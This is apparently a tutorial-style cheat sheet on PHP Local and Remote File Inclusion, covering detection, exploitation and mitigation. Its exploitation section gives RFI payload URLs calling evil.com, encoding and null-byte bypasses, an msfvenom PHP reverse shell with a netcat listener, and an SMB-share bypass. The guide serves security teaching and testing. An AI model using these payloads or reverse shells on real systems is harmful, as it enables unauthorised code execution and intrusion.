📌 Local File Inclusion (LFI) & Remote File Inclusion (RFI) – Complete Guide

A file inclusion vulnerability allows an attacker to include a file, usually exploiting a lack of proper input/output sanitization. This can lead to code execution, data theft, and website defacement.

🧠 Description & Key Differences

A File Inclusion vulnerability occurs when an application uses user-controlled input to dynamically include files without proper validation. It's often found in PHP applications using functions like `include()`, `require()`, `include_once()`, and `require_once()`.

LFI vs RFI: Key Differences

  • Local File Inclusion (LFI): The attacker includes a file already present on the target server. This can lead to reading sensitive files (e.g., `/etc/passwd`) or achieving Remote Code Execution (RCE) through techniques like log poisoning.
  • Remote File Inclusion (RFI): The attacker includes a file hosted on a remote server. This allows them to execute arbitrary code on the target server directly. RFI requires the PHP setting `allow_url_include` to be `On`.

🏷️ Classification

  • Type: File Inclusion (Injection)
  • OWASP: A03:2021 – Injection
  • CWE: CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program (RFI) / CWE-22: Improper Limitation of a Pathname to a Restricted Directory (LFI / Path Traversal)

🎯 Attack Surface (Where to Test)

  • ✅ Common vulnerable parameters: `?page=`, `?file=`, `?path=`, `?cat=`, `?dir=`, `?action=`, `?download=`, `?folder=`, `?view=`, `?content=`, `?layout=`, `?lang=`, `?template=`
  • ✅ User-supplied filenames for downloads, templates, or language files
  • ✅ Functions like `include`, `require`, `file_get_contents`, `fopen`

🔍 Detection Methodology

1. Static Analysis (Source Code)

  • Search for file inclusion functions: `include()`, `require()`, `include_once()`, `require_once()`
  • Check if user-controlled parameters are passed directly to these functions
  • Look for missing input validation or sanitization

2. Dynamic Analysis (Burp Suite / Manual)

  • Identify a file inclusion parameter and try to read a sensitive local file like `/etc/passwd`
  • Observe the response for file contents or error messages
  • Use a remote URL (e.g., `http://attacker.com/shell.txt`) to test for RFI

Tools: Burp Suite, OWASP ZAP, Kadimus, LFISuite, Fimap, LFImap

🌍 Remote File Inclusion (RFI) – Advanced Exploitation

RFI occurs when the application includes a remote file, typically via a URL. It requires the PHP setting allow_url_include = On and is often combined with the `allow_url_fopen = On` setting.

# Basic RFI
http://example.com/index.php?page=http://evil.com/shell.txt

# Null Byte (PHP < 5.3.4)
http://example.com/index.php?page=http://evil.com/shell.txt%00

# Double Encoding
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

Reverse Shell via Netcat

# Generate PHP reverse shell payload
msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.5 > shell.php

# Host the payload on a local HTTP server
python -m SimpleHTTPServer

# Set up Netcat listener
nc -lvp 4444

# Include the remote payload
http://example.com/index.php?page=http://192.168.0.5:8000/shell.php

Bypassing Blacklists

If a blacklist blocks `http://` or `https://`, try case variations like `HTTP://` or `hTTp://`.

Null Byte Attack (Bypassing .php suffix)

# The server may append .php automatically. Use ? to neutralize it.
http://example.com/index.php?page=http://evil.com/shell.txt?

Exploitation through SMB Server (Bypassing `allow_url_include`)

If `allow_url_include` is `Off`, RFI can still be exploited on Windows targets using the SMB protocol.

# Set up an SMB share with Impacket
python smbserver.py -smb2support sharepath /root/Desktop/Shells

# Include the remote file via SMB
http://example.com/index.php?page=\\192.168.0.8\sharepath\shell.txt

🛡️ Mitigation

✅ Use allowlist of allowed files: Only permit specific filenames, never user-controlled paths.
✅ Disable dangerous PHP settings: Set `allow_url_fopen = Off` and `allow_url_include = Off` in `php.ini`.
✅ Sanitize user input: Remove `../`, `..\`, `%00`, and encoded variants before processing.
✅ Use `realpath()` and `basename()`: Validate and normalize file paths before inclusion.
✅ Store files outside the web root: Prevent direct access to sensitive files.
✅ Run with least privilege: Use low-privileged users for web server processes.
✅ Regular security audits: Scan for file inclusion vulnerabilities using automated tools.
